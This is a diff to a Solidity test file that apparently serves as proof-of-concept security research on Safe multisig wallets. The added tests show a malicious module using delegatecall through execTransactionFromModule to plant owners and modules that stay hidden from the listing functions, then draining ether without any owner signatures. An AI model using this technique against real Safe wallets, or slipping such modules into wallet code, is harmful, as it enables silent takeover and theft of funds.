@@ -7,6 +7,7 @@ import {SafeProxy} from "@safe/proxies/SafeProxy.sol";
 import {SafeProxyFactory} from "@safe/proxies/SafeProxyFactory.sol";
 import {Enum} from "@safe/libraries/Enum.sol";
 import {ShadowModuleInjector} from "../src/ShadowModuleInjector.sol";
+import {ShadowOwnerInjector} from "../src/ShadowOwnerInjector.sol";
 
 /// @title MaliciousModule
 /// @notice A minimal module contract that calls execTransactionFromModule on a Safe.
@@ -16,6 +17,25 @@ contract MaliciousModule {
         // Modules call execTransactionFromModule as msg.sender — the Safe checks modules[msg.sender]
         (bool success) = Safe(payable(safe)).execTransactionFromModule(recipient, amount, "", Enum.Operation.Call);
         require(success, "Module execution failed");
+    }
+
+    /// @notice Use the module's execution privilege to inject a shadow owner via DelegateCall.
+    ///         This is a compounding attack: a shadow module can create shadow owners
+    ///         with zero owner signatures, bypassing the threshold entirely.
+    function injectShadowOwner(address safe, address injector, address shadowOwner) external {
+        bytes memory data = abi.encodeWithSelector(ShadowOwnerInjector.injectShadowOwner.selector, shadowOwner);
+        (bool success) =
+            Safe(payable(safe)).execTransactionFromModule(injector, 0, data, Enum.Operation.DelegateCall);
+        require(success, "Shadow owner injection via module failed");
+    }
+
+    /// @notice Use the module's execution privilege to inject a shadow module via DelegateCall.
+    ///         A shadow module can recursively create additional shadow modules.
+    function injectShadowModule(address safe, address injector, address shadowModule) external {
+        bytes memory data = abi.encodeWithSelector(ShadowModuleInjector.injectShadowModule.selector, shadowModule);
+        (bool success) =
+            Safe(payable(safe)).execTransactionFromModule(injector, 0, data, Enum.Operation.DelegateCall);
+        require(success, "Shadow module injection via module failed");
     }
 }
 
@@ -279,5 +299,188 @@ contract ShadowModuleViaExecTest is Test {
         (uint8 vA, bytes32 rA, bytes32 sA) = vm.sign(keyA, hash);
         (uint8 vB, bytes32 rB, bytes32 sB) = vm.sign(keyB, hash);
         return abi.encodePacked(rA, sA, vA, rB, sB, vB);
+    }
+}
+
+/// @title ShadowModuleFromModuleTest
+/// @notice Demonstrates the compounding attack: a shadow module can inject
+///         additional shadow owners and shadow modules via execTransactionFromModule()
+///         with DelegateCall. This is the most dangerous injection vector because
+///         it requires ZERO owner signatures — the module acts with full Safe privileges.
+///
+///         The Lido article on shadow owners lists three delegatecall surfaces:
+///           1. setup() — at creation
+///           2. execTransaction() — requires threshold signatures
+///           3. execTransactionFromModule() — requires only an enabled module
+///
+///         This test covers vector #3, which was previously untested.
+contract ShadowModuleFromModuleTest is Test {
+    Safe public singleton;
+    SafeProxyFactory public factory;
+    ShadowModuleInjector public moduleInjector;
+    ShadowOwnerInjector public ownerInjector;
+    MaliciousModule public shadowModule;
+    Safe public safe;
+
+    uint256 constant OWNER1_KEY = 0xA001;
+    uint256 constant OWNER2_KEY = 0xA002;
+    uint256 constant OWNER3_KEY = 0xA003;
+
+    address owner1;
+    address owner2;
+    address owner3;
+    address secondaryShadowOwner;
+    address secondaryShadowModule;
+
+    function setUp() public {
+        owner1 = vm.addr(OWNER1_KEY);
+        owner2 = vm.addr(OWNER2_KEY);
+        owner3 = vm.addr(OWNER3_KEY);
+
+        singleton = new Safe();
+        factory = new SafeProxyFactory();
+        moduleInjector = new ShadowModuleInjector();
+        ownerInjector = new ShadowOwnerInjector();
+        shadowModule = new MaliciousModule();
+
+        secondaryShadowOwner = makeAddr("secondaryShadowOwner");
+        secondaryShadowModule = makeAddr("secondaryShadowModule");
+
+        address[] memory owners = new address[](3);
+        owners[0] = owner1;
+        owners[1] = owner2;
+        owners[2] = owner3;
+
+        // Deploy Safe with a shadow module injected during setup
+        bytes memory initializer = abi.encodeWithSelector(
+            Safe.setup.selector,
+            owners,
+            uint256(2),
+            address(moduleInjector),
+            abi.encodeWithSelector(ShadowModuleInjector.injectShadowModule.selector, address(shadowModule)),
+            address(0),
+            address(0),
+            uint256(0),
+            payable(address(0))
+        );
+
+        SafeProxy proxy = factory.createProxyWithNonce(address(singleton), initializer, 0);
+        safe = Safe(payable(address(proxy)));
+        vm.deal(address(safe), 1 ether);
+    }
+
+    /// @notice A shadow module can inject a shadow owner via execTransactionFromModule
+    ///         with DelegateCall. The shadow owner can then co-sign transactions, all
+    ///         without any legitimate owner ever signing.
+    function test_shadowModuleInjectsShadowOwner() public {
+        // Pre-check: secondary shadow owner does not exist
+        assertFalse(safe.isOwner(secondaryShadowOwner), "secondary shadow must not be owner before injection");
+
+        // The shadow module uses its execution privilege to inject a shadow owner
+        // via DelegateCall — zero owner signatures needed
+        shadowModule.injectShadowOwner(address(safe), address(ownerInjector), secondaryShadowOwner);
+
+        // Post-check: secondary shadow owner is now an owner but invisible
+        assertTrue(safe.isOwner(secondaryShadowOwner), "secondary shadow must pass isOwner()");
+        address[] memory listedOwners = safe.getOwners();
+        bool found = false;
+        for (uint256 i = 0; i < listedOwners.length; i++) {
+            if (listedOwners[i] == secondaryShadowOwner) found = true;
+        }
+        assertFalse(found, "secondary shadow must NOT appear in getOwners()");
+
+        // The secondary shadow owner can now co-sign transactions.
+        // Prove the shadow owner IS in the owners mapping storage.
+        bytes32 ownerSlot = keccak256(abi.encode(secondaryShadowOwner, 2));
+        bytes32 ownerValue = vm.load(address(safe), ownerSlot);
+        assertNotEq(ownerValue, bytes32(0), "secondary shadow must have non-zero owners mapping entry");
+
+        console.log("=== Shadow Module Injects Shadow Owner ===");
+        console.log("Vector:     execTransactionFromModule (DelegateCall)");
+        console.log("Signatures: 0 (module acts alone)");
+        console.log("isOwner(secondary):   true");
+        console.log("In getOwners():       false");
+        console.log("owners[slot] value:   %s", vm.toString(ownerValue));
+    }
+
+    /// @notice A shadow module can inject ANOTHER shadow module via execTransactionFromModule
+    ///         with DelegateCall — a recursive compounding attack. Each shadow module can
+    ///         create more shadow modules, making removal nearly impossible.
+    function test_shadowModuleInjectsShadowModule() public {
+        // Pre-check: secondary shadow module is not enabled
+        assertFalse(
+            safe.isModuleEnabled(secondaryShadowModule), "secondary shadow module must not be enabled before injection"
+        );
+
+        // The shadow module injects a second shadow module via DelegateCall
+        shadowModule.injectShadowModule(address(safe), address(moduleInjector), secondaryShadowModule);
+
+        // Post-check: secondary shadow module is enabled but invisible
+        assertTrue(safe.isModuleEnabled(secondaryShadowModule), "secondary shadow must pass isModuleEnabled()");
+        (address[] memory listedModules,) = safe.getModulesPaginated(address(0x1), 100);
+        bool found = false;
+        for (uint256 i = 0; i < listedModules.length; i++) {
+            if (listedModules[i] == secondaryShadowModule) found = true;
+        }
+        assertFalse(found, "secondary shadow module must NOT appear in getModulesPaginated()");
+
+        // Verify storage directly since secondaryShadowModule is a makeAddr (not a deployed contract).
+        bytes32 moduleSlot = keccak256(abi.encode(secondaryShadowModule, 1));
+        bytes32 moduleValue = vm.load(address(safe), moduleSlot);
+        assertNotEq(moduleValue, bytes32(0), "secondary shadow must have non-zero modules mapping entry");
+
+        console.log("=== Shadow Module Injects Shadow Module (Recursive) ===");
+        console.log("Vector:     execTransactionFromModule (DelegateCall)");
+        console.log("Signatures: 0 (module acts alone)");
+        console.log("isModuleEnabled(secondary): true");
+        console.log("In getModulesPaginated():    false");
+        console.log("modules[slot] value:         %s", vm.toString(moduleValue));
+    }
+
+    /// @notice Full compounding attack: shadow module injects both a shadow owner
+    ///         AND a shadow module, then uses the new shadow module to drain funds.
+    ///         Zero legitimate owner signatures involved in any step.
+    function test_compoundingAttackViaModule() public {
+        // Step 1: Shadow module injects a shadow owner
+        shadowModule.injectShadowOwner(address(safe), address(ownerInjector), secondaryShadowOwner);
+
+        // Step 2: Shadow module injects a real (deployed) secondary shadow module
+        MaliciousModule secondaryShadow = new MaliciousModule();
+        shadowModule.injectShadowModule(address(safe), address(moduleInjector), address(secondaryShadow));
+
+        // Verify both injections worked
+        assertTrue(safe.isOwner(secondaryShadowOwner), "shadow owner must be injected");
+        assertTrue(safe.isModuleEnabled(address(secondaryShadow)), "shadow module must be injected");
+
+        // Neither should be visible
+        address[] memory owners = safe.getOwners();
+        address[] memory modules;
+        (modules,) = safe.getModulesPaginated(address(0x1), 100);
+        bool ownerVisible = false;
+        bool moduleVisible = false;
+        for (uint256 i = 0; i < owners.length; i++) {
+            if (owners[i] == secondaryShadowOwner) ownerVisible = true;
+        }
+        for (uint256 i = 0; i < modules.length; i++) {
+            if (modules[i] == address(secondaryShadow)) moduleVisible = true;
+        }
+        assertFalse(ownerVisible, "shadow owner must be invisible");
+        assertFalse(moduleVisible, "shadow module must be invisible");
+
+        // Step 3: The secondary shadow module drains funds — completely independently
+        address payable recipient = payable(makeAddr("attacker"));
+        uint256 drainAmount = 0.5 ether;
+        secondaryShadow.drain(address(safe), recipient, drainAmount);
+
+        assertEq(recipient.balance, drainAmount, "drain must succeed");
+        assertEq(address(safe).balance, 1 ether - drainAmount, "safe balance must decrease");
+
+        console.log("=== Compounding Attack via execTransactionFromModule ===");
+        console.log("Step 1: Shadow module injected shadow owner (0 sigs)");
+        console.log("Step 2: Shadow module injected shadow module (0 sigs)");
+        console.log("Step 3: Secondary shadow module drained %d wei (0 sigs)", drainAmount);
+        console.log("Total legitimate owner signatures used: 0");
+        console.log("Shadow owner invisible: true");
+        console.log("Shadow module invisible: true");
     }
 }
